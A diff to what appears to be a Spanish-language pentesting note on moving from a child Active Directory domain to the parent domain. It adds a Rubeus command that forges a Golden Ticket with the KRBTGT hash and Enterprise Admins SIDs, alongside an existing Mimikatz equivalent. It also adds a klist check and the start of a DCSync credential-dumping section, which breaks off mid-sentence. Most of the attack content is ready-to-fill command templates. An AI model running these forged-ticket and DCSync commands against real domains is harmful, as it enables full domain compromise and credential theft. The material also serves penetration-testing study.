@@ -52,7 +52,7 @@ Get-ADGroup -Identity "Enterprise Admins" -Server "<Dominio.Principal>"
 Get-DomainGroup -Domain <Dominio.Principal> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
-### Explotacion -> MIMIKATZ
+### Explotación -> MIMIKATZ
 Podemos realizar la explotación después de obtener toda la información usando [[MIMIKATZ]]
 Creando primero el `GOLDEN TICKET`
 
@@ -60,3 +60,23 @@ Creando primero el `GOLDEN TICKET`
 kerberos:golden /user:hacker/<Dominio.Principal> /domain:<Dominio.Principal> /sid:<SID.Secundario> /krbtgt:<hash> /sids:<SID.Principal> /ppt
 ```
 
+### Explotación -> ROBEUS
+Podem[[]]os realizar la explotación después de obtener toda la información usando [[ROBEUS]]
+Creando primero el `GOLDEN TICKET`
+
+```shell
+rubeus golden /rc4:<hash.KRBTGT> /domain:<Dominio.Principal> /sid:<SID.Secundario>  /sids:<SID.Principal> /user:hacker/<Dominio.Principal> /ppt
+```
+
+
+### Validacion Golden Ticket
+Usaremos el comando 
+
+```shell
+klist
+```
+
+Para validar que el ticket se encuentra en la memoria, viendo que se encuentra ahi desde nustro dominio secundario(child) podemos ver el dominio principal y escalarlo a un ataque `DCSync`
+
+# DCSync Attack
+Usando la herramienta de [[MIMIKATZ]] podemos ejecutar este ataque para obtener las credenciales de un usuario de la maquina de domini
